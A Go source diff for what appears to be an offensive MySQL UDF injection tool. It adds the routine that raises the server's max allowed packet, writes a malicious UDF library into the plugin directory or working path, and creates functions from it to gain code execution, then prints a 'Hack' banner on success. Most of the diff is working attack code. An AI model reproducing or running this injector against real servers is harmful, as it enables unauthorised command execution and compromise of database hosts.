@@ -4,6 +4,7 @@ import (
 	"flag"
 	"fmt"
 	"io/ioutil"
+	"time"
 
 	"github.com/pelletier/go-toml"
 
@@ -47,9 +48,9 @@ func main() {
 			fmt.Print("load UDF failed:", err)
 			return
 		}
+		str := injecter.RandomStr(11)
 		udf[t] = &injecter.UDF{
-			// "xxxxxxxx.xxx"
-			Name: injecter.RandomStr(8) + "." + injecter.RandomStr(3),
+			Name: str[:8] + "." + str[8:], // "xxxxxxxx.xxx"
 			Data: data,
 		}
 		fmt.Printf("[+] load UDF: %s\n", t)
@@ -63,7 +64,7 @@ func main() {
 			fmt.Print("direct connect failed:", err)
 			return
 		}
-		fmt.Printf("[+] direct connect %s\n", host)
+		fmt.Printf("[*] direct connect %s successfully\n", host)
 	case "pma":
 		fmt.Print("not support now")
 		return
@@ -71,6 +72,7 @@ func main() {
 		fmt.Print("unknown inject mode")
 		return
 	}
+	defer handle.Close()
 	// start inject
 	if len(udf) == 0 || len(cfg.Func) == 0 {
 		fmt.Print("[-] no UDF or no Functions")
@@ -115,7 +117,7 @@ func main() {
 	}
 	fmt.Println("[!] unmatched OS & Arch, attempt all UDF")
 	for t, u := range udf {
-		fmt.Println("[+] attempt", t)
+		fmt.Println("[*] attempt", t)
 		if ver < 501 { // version < 5.1.xx
 			if injectUDF(handle, u, cfg.Func, false) {
 				return
@@ -129,7 +131,94 @@ func main() {
 	fmt.Println("[-] all attempts failed")
 }
 
-func injectUDF(handle injecter.Handle, udf *injecter.UDF, funcs []*injecter.Func, v51 bool) bool {
-	fmt.Println("[*] inject successfully")
+func injectUDF(handle injecter.Handle, udf *injecter.UDF, funcs []*injecter.Func, v51 bool) (ok bool) {
+	// check MaxAllowedPacket
+	size, err := injecter.GetMaxAllowedPacket(handle)
+	if err != nil {
+		fmt.Println("[-]", err)
+		return
+	}
+	fmt.Println("[+] max allowed packet:", size)
+	expectSize := len(udf.Data) + 512
+	var setMaxAllowedPacket bool
+	if size < expectSize {
+		fmt.Println("[!] max allowed packet is smaller than expect size")
+		err = injecter.SetMaxAllowedPacket(handle, expectSize)
+		if err != nil {
+			fmt.Println("[-]", err)
+			return
+		}
+		fmt.Println("[*] set max allowed packet successfully")
+		setMaxAllowedPacket = true
+	}
+	defer func() {
+		// recover MaxAllowedPacket
+		if setMaxAllowedPacket {
+			_ = injecter.SetMaxAllowedPacket(handle, size)
+			fmt.Println("[*] recover max allowed packet")
+		}
+		if ok {
+			printHack()
+		}
+	}()
+	// dump UDF file
+	var path string
+	if v51 { // 5.1.xx
+		// get plugin path
+		dir, err := injecter.GetPluginDir(handle)
+		if err != nil {
+			fmt.Println("[-]", err)
+			return
+		}
+		path = dir + "/" + udf.Name
+	} else { // 5.0.xx
+		// dump current path
+		path = "./" + udf.Name
+	}
+	fmt.Println("[+] dump UDF path:", path)
+	err = injecter.DumpFile(handle, udf.Data, path)
+	if err != nil {
+		fmt.Println("[-]", err)
+		return
+	}
+	fmt.Println("[*] dump UDF file successfully")
+	// create funcs
+	for i := 0; i < len(funcs); i++ {
+		err = injecter.CreateFunc(handle, funcs[i], udf.Name)
+		if err != nil {
+			fmt.Println("[-]", err)
+			return
+		}
+		fmt.Printf("[*] create function: %s successfully\n", funcs[i].Name)
+	}
 	return true
+}
+
+func printHack() {
+	fmt.Println("[*] #################################################################")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##                                                             ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##   ★★★  ★★★                            ★★            ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##     ★      ★                                ★            ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##     ★      ★                                ★            ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##     ★      ★      ★★★        ★★★★    ★  ★★★    ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##     ★★★★★    ★      ★    ★      ★    ★    ★      ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##     ★      ★        ★★★    ★            ★  ★        ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##     ★      ★      ★    ★    ★            ★★★        ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##     ★      ★    ★      ★    ★      ★    ★    ★      ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##   ★★★  ★★★    ★★★★★    ★★★    ★★★  ★★    ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] ##                                                             ##")
+	time.Sleep(50 * time.Millisecond)
+	fmt.Println("[*] #################################################################")
+	time.Sleep(time.Second)
 }
